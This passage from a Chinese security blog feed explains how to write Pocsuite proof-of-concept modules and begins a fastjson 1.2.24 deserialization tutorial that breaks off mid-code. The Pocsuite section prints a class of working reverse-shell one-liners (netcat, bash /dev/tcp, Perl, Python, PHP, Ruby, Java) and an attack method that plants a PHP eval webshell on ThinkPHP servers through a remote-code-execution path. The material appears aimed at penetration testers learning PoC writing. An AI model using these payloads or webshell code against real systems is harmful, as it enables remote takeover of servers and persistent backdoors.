<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE_PAYLOAD</span>:</span></span><br><span class="line">    NC = <span class="string">&quot;&quot;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;0&#125; &#123;1&#125; &gt;/tmp/f&quot;&quot;&quot;</span></span><br><span class="line">    NC2 = <span class="string">&quot;&quot;&quot;nc -e /bin/sh &#123;0&#125; &#123;1&#125;&quot;&quot;&quot;</span></span><br><span class="line">    NC3 = <span class="string">&quot;&quot;&quot;rm -f /tmp/p;mknod /tmp/p p &amp;&amp; nc &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    BASH = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    BASH2 = <span class="string">&quot;&quot;&quot;bash -c &#x27;sh -i &amp;gt;&amp;amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&amp;gt;&amp;amp;1&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    TELNET = <span class="string">&quot;&quot;&quot;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &#123;0&#125; &#123;1&#125; 0/tmp/p&quot;&quot;&quot;</span></span><br><span class="line">    PERL = <span class="string">&quot;&quot;&quot;perl -e &#x27;use Socket;$i=&quot;&#123;0&#125;&quot;;$p=&#123;1&#125;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;&#125;;&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PYTHON = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&#123;0&#125;&quot;,&#123;1&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    PHP = <span class="string">&quot;&quot;&quot;php -r &#x27;$sock=fsockopen(&quot;&#123;0&#125;&quot;,&#123;1&#125;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    RUBY = <span class="string">&quot;&quot;&quot;ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;&#123;0&#125;&quot;,&#123;1&#125;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;&quot;&quot;&quot;</span></span><br><span class="line">    JAVA = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    r = Runtime.getRuntime()</span></span><br><span class="line"><span class="string">    p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/&#123;0&#125;/&#123;1&#125;;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span></span><br><span class="line"><span class="string">    p.waitFor()</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OptDict</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, require=<span class="literal">False</span>, selected=<span class="literal">False</span>, default=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="comment"># super().__init__(default, &#x27;&#x27;, require)</span></span><br><span class="line">        self.default = &#123;&#125;</span><br><span class="line">        b = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> default.items():</span><br><span class="line">            self.default[k] = v</span><br><span class="line">            b += <span class="string">&quot;&#123;k&#125;:&#123;v&#125;\n&quot;</span>.<span class="built_in">format</span>(k=k, v=v)</span><br><span class="line">        self.selected = selected</span><br><span class="line">        self.require = require</span><br><span class="line">        self.<span class="built_in">type</span> = <span class="string">&quot;Dict&quot;</span></span><br><span class="line">        self.__set__(<span class="string">&quot;&quot;</span>, selected)</span><br><span class="line"></span><br><span class="line">        self.description = <span class="string">&quot;&#123;&#125;\nYou can select &#123;&#125; ,default:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(b,</span><br><span class="line">                                                                      <span class="built_in">repr</span>(self.default.keys()),self.selected)</span><br></pre></td></tr></table></figure>



<h4 id="def-verify-self"><a href="#def-verify-self" class="headerlink" title="def _verify(self)"></a>def _verify(self)</h4><p>_verify()漏洞检测函数为Poc中最重要的函数，检测漏洞是否存在的逻辑关系。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _verify(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        p = self._check(self.url)</span><br><span class="line">        if p:</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;] = &#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = p[0]</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = p[1]</span><br><span class="line"></span><br><span class="line">        return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>当该poc为exp模块时，_verify()为固定写法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _verify(self):	#exp模块固定写法</span><br><span class="line">       output = Output(self)</span><br><span class="line">       result = &#123;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="def-attack-self"><a href="#def-attack-self" class="headerlink" title="def _attack(self)"></a>def _attack(self)</h4><p>该方法为攻击模式的方法，编写对该漏洞利用的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _attack(self):</span><br><span class="line">       result = &#123;&#125;</span><br><span class="line">       filename = random_str(6) + &quot;.php&quot;</span><br><span class="line">       webshell = r&#x27;&#x27;&#x27;&lt;?php echo &quot;green day&quot;;@eval($_POST[&quot;pass&quot;]);?&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">       p = self._check(self.url)</span><br><span class="line">       if p:</span><br><span class="line">           data = p[1]</span><br><span class="line">           data[&quot;vars[1][]&quot;] = &quot;echo%20%27&#123;content&#125;%27%20&gt;%20&#123;filename&#125;&quot;.format(filename=filename,</span><br><span class="line">                                                                                content=quote(webshell))</span><br><span class="line">           data[&quot;vars[0]&quot;] = &quot;system&quot;</span><br><span class="line">           vulurl = self.url + p[0]</span><br><span class="line">           requests.post(vulurl, data=data)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line">       if not result:</span><br><span class="line">           vulurl = self.url + r&quot;/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=&#123;filename&#125;&amp;content=&#123;content&#125;&quot;</span><br><span class="line">           vulurl = vulurl.format(filename=filename, content=quote(webshell))</span><br><span class="line">           requests.get(vulurl)</span><br><span class="line">           r = requests.get(self.url + &quot;/&quot; + filename)</span><br><span class="line">           if r.status_code == 200 and &quot;green day&quot; in r.text:</span><br><span class="line">               result[&#x27;ShellInfo&#x27;] = &#123;&#125;</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;URL&#x27;] = self.url + &quot;/&quot; + filename</span><br><span class="line">               result[&#x27;ShellInfo&#x27;][&#x27;Content&#x27;] = webshell</span><br><span class="line"></span><br><span class="line">       return self.parse_output(result)</span><br></pre></td></tr></table></figure>



<p>若该poc没有攻击模式，该方法可返回_verify()方法或者不写该方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _attack(self):			#注意:若该poc没有攻击模式，在_attack函数下，return self._verify(),不用再写_attack()</span><br><span class="line">return self._verify()</span><br></pre></td></tr></table></figure>



<h4 id="def-parse-output-self-result"><a href="#def-parse-output-self-result" class="headerlink" title="def parse_output(self, result)"></a>def parse_output(self, result)</h4><p>使用Output()函数判断探测结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line">    output = Output(self)</span><br><span class="line">    if result:</span><br><span class="line">        output.success(result)</span><br><span class="line">    else:</span><br><span class="line">        output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">    return output</span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure>



<p>上述POC中涉及到的Output类代码，通过isinstance()函数判断传入的result是否为字典类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Output(object):</span><br><span class="line">    def __init__(self, poc=None):</span><br><span class="line">        self.error_msg = tuple()</span><br><span class="line">        self.result = &#123;&#125;</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        if poc:</span><br><span class="line">            self.url = poc.url</span><br><span class="line">            self.mode = poc.mode</span><br><span class="line">            self.vul_id = poc.vulID</span><br><span class="line">            self.name = poc.name</span><br><span class="line">            self.app_name = poc.appName</span><br><span class="line">            self.app_version = poc.appVersion</span><br><span class="line">            self.error_msg = poc.expt</span><br><span class="line">    def success(self, result):</span><br><span class="line">        assert isinstance(result, dict)</span><br><span class="line">        self.status = OUTPUT_STATUS.SUCCESS</span><br><span class="line">        self.result = result</span><br><span class="line"></span><br><span class="line">    def fail(self, error=&quot;&quot;):</span><br><span class="line">        assert isinstance(error, str)</span><br><span class="line">        self.status = OUTPUT_STATUS.FAILED</span><br><span class="line">        self.error_msg = (0, error)</span><br><span class="line"></span><br><span class="line">class OUTPUT_STATUS:</span><br><span class="line">    SUCCESS = 1</span><br><span class="line">    FAILED = 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在使用Pocsuite的时候，我们可以用<code>--verify</code>参数来调用<code>_verify</code>方法，用<code>--attack</code>参数来调用<code>_attack</code>方法。</p>
<h3 id="库的使用"><a href="#库的使用" class="headerlink" title="库的使用"></a>库的使用</h3><p>Python库引用模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pocsuite.api.poc import register</span><br><span class="line">from pocsuite.api.poc import Output, POCBase</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br></pre></td></tr></table></figure>



<h4 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h4><p>pocsuite 中自带经过改装的 req，from pocsuite.api.request import req，pocsuite 中的 req 可以使用随机的 UA</p>
<p>requests库的七个主要方法:</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207183053786.png" class title="image-20220207183053786">



<p>对于在编写poc中常用到的几个request库的函数为get(),post()和put(),所有的函数调用格式相同。</p>
<p>函数格式如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r=requests.get(url,params,**kwargs)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url: 需要爬取的网站地址。</span><br><span class="line"></span><br><span class="line">params: 翻译过来就是参数， url中的额外参数，字典或者字节流格式，可选。</span><br><span class="line"></span><br><span class="line">**kwargs : 12个控制访问的参数</span><br><span class="line">params：字典或字节序列， 作为参数增加到url中,使用这个参数可以把一些键值对以?key1=value1&amp;key2=value2的模式增加到url中</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;:&#x27; values&#x27;, &#x27;key2&#x27;: &#x27;values&#x27;&#125; </span><br><span class="line">r = requests.get(&#x27;http:www.python123.io/ws&#x27;, params=kw)</span><br><span class="line"></span><br><span class="line">data：字典，字节序或文件对象，重点作为向服务器提供或提交资源是提交，，作为request的内容，与params不同的是，data提交的数据并不放在url链接里， 而是放在url链接对应位置的地方作为数据来存储。，它也可以接受一个字符串对象。(request.post()函数)</span><br><span class="line"></span><br><span class="line">json：json格式的数据， json合适在相关的html，http相关的web开发中非常常见， 也是http最经常使用的数据格式， 他是作为内容部分可以向服务器提交。</span><br><span class="line">例如：kv = &#123;&#x27;key1&#x27;: &#x27;value1&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, json=kv)</span><br><span class="line"></span><br><span class="line">headers：字典是http的相关语，对应了向某个url访问时所发起的http的头i字段， 可以用这个字段来定义http的访问的http头，可以用来模拟任何我们想模拟的浏览器来对url发起访问。</span><br><span class="line">例子： hd = &#123;&#x27;user-agent&#x27;: &#x27;Chrome/10&#x27;&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, headers=hd)</span><br><span class="line"></span><br><span class="line">cookies：字典或CookieJar，指的是从http中解析cookie</span><br><span class="line"></span><br><span class="line">auth：元组，用来支持http认证功能</span><br><span class="line"></span><br><span class="line">files：字典， 是用来向服务器传输文件时使用的字段。</span><br><span class="line">例子：fs = &#123;&#x27;files&#x27;: open(&#x27;data.txt&#x27;, &#x27;rb&#x27;)&#125; </span><br><span class="line">r = requests.post(&#x27;http://python123.io/ws&#x27;, files=fs)</span><br><span class="line"></span><br><span class="line">timeout: 用于设定超时时间， 单位为秒，当发起一个get请求时可以设置一个timeout时间， 如果在timeout时间内请求内容没有返回， 将产生一个timeout的异常。</span><br><span class="line"></span><br><span class="line">proxies：字典， 用来设置访问代理服务器。</span><br><span class="line"></span><br><span class="line">allow_redirects: 开关， 表示是否允许对url进行重定向， 默认为True。</span><br><span class="line"></span><br><span class="line">stream: 开关， 指是否对获取内容进行立即下载， 默认为True。</span><br><span class="line"></span><br><span class="line">verify：开关， 用于认证SSL证书， 默认为True。</span><br><span class="line"></span><br><span class="line">cert： 用于设置保存本地SSL证书路径</span><br></pre></td></tr></table></figure>



<p>其中response对象有以下属性：</p>
<img src="/2022/02/07/Pocsuite%E4%BD%BF%E7%94%A8%E5%8F%8APoc%E7%BC%96%E5%86%99/image-20220207184854731.png" class title="image-20220207184854731">



<p><strong>requests库的异常</strong></p>
<p>注意<code>requests</code>库有时会产生异常，比如网络连接错误、<code>http</code>错误异常、重定向异常、请求<code>url</code>超时异常等等。所以我们需要判断<code>r.status_codes</code>是否是200，在这里我们怎么样去捕捉异常呢？</p>
<p>这里我们可以利用<code>r.raise_for_status()</code> 语句去捕捉异常，该语句在方法内部判断<code>r.status_code</code>是否等于200，如果不等于，则抛出异常。</p>
<p>于是在这里我们有一个爬取网页的通用代码框架：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    r=requests.get(url,timeout=30)#请求超时时间为30秒</span><br><span class="line">    r.raise_for_status()#如果状态不是200，则引发异常</span><br><span class="line">    r.encoding=r.apparent_encoding #配置编码</span><br><span class="line">    return r.text</span><br><span class="line">except:</span><br><span class="line">    return &quot;产生异常&quot; </span><br></pre></td></tr></table></figure>



<h2 id="Windows下Pocsuite写日志URL带冒号报错"><a href="#Windows下Pocsuite写日志URL带冒号报错" class="headerlink" title="Windows下Pocsuite写日志URL带冒号报错"></a>Windows下Pocsuite写日志URL带冒号报错</h2><h3 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h3><p>Windows平台使用Pocsuite，当输入的url带有<code>:</code>的时会报错，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[WARNING] unable to create output directory </span><br><span class="line">         &#x27;C:\Users\Administrator\.pocsuite\output\127.0.0.1:8080&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h3><p>原来保存日志记录会选取<code>C:\Users\Administrator\.pocsuite\output\</code>拼接上url地址，而windows下文件名不允许含有<code>:</code>，所以才会报错。</p>
<p>所以，不论URL是<code>http://</code>还是带有冒号都会报错，看来pocsuite这边在创建这个文件名的时候名没有检查文件名字是否还有特殊符号呀。</p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>手动改代码解决问题：反向追踪哪个文件做了创建文件夹的操作。</p>
<p>经查找，发现该操作代码存在于<code>pocsuite\lib\controller\controller.py</code>文件。</p>
<p>从131行代码开始，定义了一个<code>_setRecordFiles()</code>函数，该函数会创建文件夹。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def _setRecordFiles():</span><br><span class="line">    for (target, pocname, pocid, component, version, status, r_time, result) in kb.results:</span><br><span class="line">        if type(status) != str:</span><br><span class="line">            status = status[1]</span><br><span class="line">            target=target.replace(&quot;:&quot;,&quot;_&quot;) #这里添加了一行替换代码</span><br><span class="line">        outputPath = os.path.join(getUnicode(paths.POCSUITE_OUTPUT_PATH), normalizeUnicode(getUnicode(target)))</span><br></pre></td></tr></table></figure>



<p>可以发现<code>_setRecordFiles()</code>函数从<code>kb.results</code>这个数据实例里面取值。</p>
<p>我们用<code>target=target.replace(&quot;:&quot;,&quot;_&quot;)</code>来将<code>:</code>替换成<code>&quot;_&quot;</code>，问题解决。</p>
]]></content>
      <categories>
        <category>内功心法</category>
        <category>Poc编写</category>
      </categories>
      <tags>
        <tag>-Pocsuite扫描器 -Poc编写</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson1.2.24反序列化</title>
    <url>/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="fastjson1-2-24反序列化"><a href="#fastjson1-2-24反序列化" class="headerlink" title="fastjson1.2.24反序列化"></a>fastjson1.2.24反序列化</h1><hr>
<p>在最近的项目中，前辈同事多次对fastjson版本进行反序列化漏洞实现RCE。项目中很多站点使用json字符串提交数据，所以就来学习学习如何探测fastjson版本和如何利用fastjson1.2.24反序列化导致RCE</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
<p>这里就主要分析一下<code>fastjson 1.2.24</code>版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><hr>
<p>fastjson是一个非常流行的库，它可以将数据在<code>JSON</code>和<code>Java Object</code>之间互相转换，我们常说的fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr>
<ul>
<li><p>pom.xml</p>
<p>在pom.xml配置文件中添加fastjson的依赖</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>​      右键点击pom.xml文件,依次选择[maven]–&gt;[Download Sources  and Documentations]下载 配置文件中的依赖项</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109152657979.png" class title="image-20211109152657979">



<ul>
<li><p>导入jar包</p>
<p>首先在maven repository中找到下载的jar包地址</p>
<p><a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">下载地址</a></p>
</li>
</ul>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153634446.png" class title="image-20211109153634446">



<p>​      在仓库中找到所要下载的fastjson版本(这里选用fastjson1.2.24)</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109153743931.png" class title="image-20211109153743931">





<h2 id="序列化-x2F-反序列化"><a href="#序列化-x2F-反序列化" class="headerlink" title="序列化&#x2F;反序列化"></a>序列化&#x2F;反序列化</h2><hr>
<p>为了更清晰的了解Fastjson中JSON字符串和对象的转换，使用IDE简单验证fastjson的序列和反序列</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><hr>
<p>使用JSON.toJsonString()方法将Java对象中的属性及其对应值转换为Json字符串</p>
<p><strong>DEMO</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">66</span>);</span><br><span class="line">        user.setUsername(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String json = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到将java对象使用JSON序列化(JSON.tojsonstring())转换为Json字符串</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109155435748.png" class title="image-20211109155435748">



<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><hr>
<p>fastjson1.2.24反序列化自动调用对应对象类中的setxxx()方法，将JSON字符串中的属性及其对应值通过对象类中的setxx()方法实例化</p>
<p>比如JSON字符串 {“age”:66,”username”:”test”}反序列化User类</p>
<p><strong>Demo1</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unSerialization</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span>&#123;</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;  <span class="comment">//定义json字符串</span></span><br><span class="line">        User user = JSON.parseObject(json,User.class);       <span class="comment">//反序列化User类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lass User&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Username:&quot;</span>+<span class="keyword">this</span>.username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;call Age&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age:&quot;</span>+<span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>可以看到运行结果中输出了setxxx()方法中的字符串。所以在反序列化中JSON.parseObject(json，对象类名.class)自动调用了setxxx()方法，</p>
<img src="/2021/11/09/fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211109161833326.png" class title="image-20211109161833326">



<p>这里的反序列化使用的是<code>parseObject()</code>方法，其实也可以用到<code>parse()</code>方法，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但<code>parseObject()</code> 会将Java对象转为 <code>JSONObject</code>对象，即<code>JSON.toJSON()</code>.</p>
<p>parseObject()和parse()最主要的区别就是前者返回的是<code>JSONObject</code>，而后者会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，返回的是实际类型的对象.当在没有对应类的定义的情况下（没有在<code>@type</code>声明类），通常情况下都会使用<code>JSON.parseObject</code>来获取数据。</p>
<p>由于<code>JSON.parseObject()</code>要反序列化到<strong>对应的对象（比如demo中的User类对象，需要将第二个参数设置为<code>User.class</code>）</strong>才会触发类的<code>setXXX</code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）。那要怎么处理才能让<code>JSON.parseObject()</code>在调用时，不输入第二个参数也能执行<code>setXXX</code>方法呢？我们使用parse()方法中下@type指定转换的类。</p>
<p><strong>Demo2</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">unserialization1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">     String json1 = <span class="string">&quot;&#123;\&quot;age\&quot;:123,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     String json2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;&#125;&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化Json1字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json1);</span><br><span class="line">     System.out.println(<span class="string">&quot;反序列化json2字符串&quot;</span>);</span><br><span class="line">     JSON.parseObject(json2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        System.out.println(<span class="string">&quot;call SetUsername&quot;</span>);</span><br><span class="line">        System.out.println(<span 